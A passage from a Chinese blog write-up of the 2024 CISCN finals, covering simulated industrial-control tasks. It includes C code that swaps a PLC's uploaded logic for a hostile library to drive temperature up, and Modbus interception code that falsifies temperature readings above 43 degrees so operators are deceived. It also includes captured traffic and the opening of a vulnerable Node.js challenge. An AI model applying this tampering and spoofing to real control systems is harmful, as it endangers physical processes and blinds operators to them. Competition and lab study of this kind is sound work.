                s<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        s<span class="token punctuation">[</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> fsrc<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/root/2024buildup/src/logic/hack_logic/libthermostat_logic.so"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span><span class="token operator">*</span> fn<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Strcpy</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token string">"logic_bin/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Strcat</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> fdst<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>len<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                ret<span class="token operator">=</span><span class="token function">write</span><span class="token punctuation">(</span>fdst<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token operator">&lt;</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>
                len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>fdst<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//文件替换代码结束</span>
        <span class="token function">ex_module_sendmsg</span><span class="token punctuation">(</span>sub_proc<span class="token punctuation">,</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后是撰写路由规则。plugin里面只需要把模块加进去即可。路由规则的话，直接跑一遍脚本然后看日志，决定在哪里搞切面。</p>
<p>instance&#x2F;engineer&#x2F;station&#x2F;plugin_config.cfg.task_2_2</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">1</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_replace"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg.task_2_2</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
        <span class="token property">"policy_head"</span><span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>
                <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
                <span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span>
                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>
        <span class="token punctuation">[</span>
                <span class="token punctuation">&#123;</span>
                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>
                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token punctuation">]</span>
                <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>
                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>
                <span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"policy_head"</span><span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"bin_upload"</span><span class="token punctuation">,</span>
                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>
                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
                <span class="token property">"rjump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"filereplace"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>
        <span class="token punctuation">[</span>
                <span class="token punctuation">&#123;</span>
                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>
                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span>
                <span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跑验证脚本看看</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120528156.png" alt="image-20240713120528156"></p>
<p>上传逻辑没问题</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120803696.png" alt="image-20240713120803696"></p>
<p>温度上升，攻击成功</p>
<hr>
<h3 id="modbus数据监听与篡改"><a href="#modbus数据监听与篡改" class="headerlink" title="modbus数据监听与篡改"></a>modbus数据监听与篡改</h3><p>本任务演示对modbus协议数据的攻击行为，选手需要对modbus协议有基础的了解。</p>
<blockquote>
<p>在modbus_hacker实例中，modbus_monitor模块接入到modbus主设备和从设备的通信线路中，准备窃听当前温度。窃听温度后不必输出，当温度超过43度时，模块应篡改回传的温度数值，使操作员和监视员看到的温度始终低于43度。</p>
</blockquote>
<p>可以用operator_start.sh脚本观察modbus协议的输入输出，modbus_hacker实例的<code>modbus_monitor</code>模块会打印协议的输入输出信息。注意后续实验时，为测试访控和加密效果，modbus_monitor模块建议改回原版模块。</p>
<br>

<p>本题需要修改一个源码文件<code>modbus_monitor.c</code> ：执行modbus协议数据窃听modbus协议温度数值并进行篡改攻击</p>
<p>核心效果，就是当温度高于43度的时候，将数据篡改为低于43度，以实现对温度监控的破坏</p>
<p>在本地运行<code>operator_start.sh</code>，获得一组用于分析的数据：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
01 00 00 00 00 06 01 05 02 00 00 ff 
 get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>
01 00 00 00 00 06 01 05 02 00 00 ff 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ON"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_S"</span>,<span class="token string">"value"</span>:65280
,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
02 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
02 00 00 00 00 05 01 04 02 8c <span class="token number">10</span> 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:423
<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f 
 get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>
03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ADJUST"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"set_T"</span>,<span class="token string">"value"</span>:3900,
<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 target T is <span class="token number">3900</span><span class="token operator">!</span>
<span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span> 
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
04 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
04 00 00 00 00 05 01 04 02 9d <span class="token number">13</span> 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:502
<span class="token number">1</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
05 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
05 00 00 00 00 05 01 03 02 09 00 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span>
<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
<span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span> 
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
06 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
06 00 00 00 00 05 01 04 02 <span class="token number">12</span> 1c 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:718
<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
07 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
07 00 00 00 00 05 01 03 02 09 00 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span>
<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
<span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span> 
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
08 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
08 00 00 00 00 05 01 04 02 b3 1e 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:785
<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
09 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
09 00 00 00 00 05 01 03 02 09 00 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span>
<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
<span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span> 
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
0a 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
0a 00 00 00 00 05 01 04 02 c2 1f 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:813
<span class="token number">0</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
 get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>
0b 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00 
 get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>
0b 00 00 00 00 05 01 03 02 09 00 
<span class="token punctuation">&#123;</span>
<span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span>
<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span>
<span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与上文的比对，可以得到温度数据<code>curr_T</code>应该由<code>server端</code>得到，改变的为<code>Buf[9]</code>和<code>Buf[10]</code>两个部分</p>
<table>
<thead>
<tr>
<th>modbus data from server</th>
<th>Buf[9], Buf[10]</th>
<th>curr_T value</th>
</tr>
</thead>
<tbody><tr>
<td>02 00 00 00 00 05 01 04 02 8c 10</td>
<td>8c 10</td>
<td>4236</td>
</tr>
<tr>
<td>04 00 00 00 00 05 01 04 02 9d 13</td>
<td>9d 13</td>
<td>5021</td>
</tr>
<tr>
<td>06 00 00 00 00 05 01 04 02 12 1c</td>
<td>12 1c</td>
<td>7186</td>
</tr>
<tr>
<td>08 00 00 00 00 05 01 04 02 b3 1e</td>
<td>b3 1e</td>
<td>7859</td>
</tr>
<tr>
<td>0a 00 00 00 00 05 01 04 02 c2 1f</td>
<td>c2 20</td>
<td>8130</td>
</tr>
</tbody></table>
<p>观察发现是小端存储，写一个检测</p>
<p>src&#x2F;security&#x2F;modbus_monitor&#x2F;modbus_monitor.c</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 窃取数据和篡改数据的位置开始</span>
            
         <span class="token keyword">if</span><span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token keyword">int</span> temperature <span class="token operator">=</span> <span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span> <span class="token punctuation">(</span>temperature <span class="token operator">>=</span> <span class="token number">4300</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                 Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
                 Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>
             <span class="token punctuation">&#125;</span>
         <span class="token punctuation">&#125;</span>
 

<span class="token comment">//窃取数据和篡改数据的位置结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>重新编译，然后执行验证脚本</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713165910986.png" alt="image-20240713165910986"></p>
<p>温度稳定显示在4200</p>
<hr>
<h2 id="访问控制模拟任务"><a href="#访问控制模拟任务" class="headerlink" title="访问控制模拟任务"></a>访问控制模拟任务</h2><p>后面两题交给队友了，我开摆（</p>
<h3 id="角色验证"><a href="#角色验证" class="headerlink" title="角色验证"></a>角色验证</h3><hr>
<h3 id="角色权限限制"><a href="#角色权限限制" class="headerlink" title="角色权限限制"></a>角色权限限制</h3><hr>
<h2 id="密码保护模拟任务"><a href="#密码保护模拟任务" class="headerlink" title="密码保护模拟任务"></a>密码保护模拟任务</h2><hr>
<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>day1可信计算</p>
<p>day2车联网+工控</p>
<p>因为都没接触过所以这部分全交给队友们来做</p>
<hr>
<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>被定式思维害了，第6轮开始我才修好js，按理来说15次提交机会上来就应该waf拉满赌一赌的</p>
<p>@chen那边也是修二打一，真厉害（川腔</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720150051765.png" alt="image-20240720150051765"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>break遗憾四血</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> ejs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span><span class="token parameter">filePath</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>

    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">IfLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
